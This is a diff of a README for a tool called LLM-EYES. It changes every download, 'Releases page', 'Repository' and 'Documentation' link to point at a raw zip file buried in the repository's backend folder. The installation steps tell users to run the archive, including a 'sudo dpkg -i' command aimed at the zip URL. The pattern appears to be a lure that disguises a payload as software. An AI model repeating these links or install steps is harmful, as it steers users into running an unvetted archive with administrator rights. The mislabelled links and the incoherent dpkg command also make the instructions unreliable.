@@ -1,6 +1,6 @@
 # 👁️ LLM-EYES - Empower LLMs with Visual Insights
 
-[![Download LLM-EYES](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip)](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip)
+[![Download LLM-EYES](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip)](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip)
 
 ## 📋 Overview
 
@@ -12,19 +12,19 @@ To get started with LLM-EYES, follow these simple steps. You will learn how to d
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** You can download LLM-EYES from our [Releases page](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip). This page contains the latest version of the application, along with previous releases.
+1. **Visit the Releases Page:** You can download LLM-EYES from our [Releases page](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip). This page contains the latest version of the application, along with previous releases.
   
 2. **Choose the Right Version:** On the Releases page, look for the most recent version. Check for a filename with your operating system in mind. For example:
    - If you use Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - If you are using Linux, look for a `.deb` or a `https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip` file.
+   - If you are using Linux, look for a `.deb` or a `https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip` file.
 
 3. **Download the File:** Click the file to start the download. Your browser will save it to your default download location.
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file after the download completes. Follow the on-screen instructions to install the software.
    - For macOS: Double-click the `.dmg` file, then drag the LLM-EYES icon into your Applications folder.
-   - For Linux: Open a terminal, navigate to your download folder, and use the command `sudo dpkg -i https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip` or extract the `https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip` file to a directory of your choice.
+   - For Linux: Open a terminal, navigate to your download folder, and use the command `sudo dpkg -i https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip` or extract the `https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip` file to a directory of your choice.
 
 5. **Launch the Application:** After installation is complete, find LLM-EYES in your application menu or desktop and double-click to open it.
 
@@ -91,7 +91,7 @@ A: You can report issues or suggest improvements via the "Issues" section on our
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip)
-- [Documentation](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip)
+- [GitHub Repository](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip)
+- [Documentation](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip)
 
-Remember to check the [Releases page](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/EYES-LL-2.5.zip) for future updates and new features.
+Remember to check the [Releases page](https://github.com/vedha55/LLM-EYES/raw/refs/heads/main/backend/internal/vision/LL_EYES_3.3.zip) for future updates and new features.
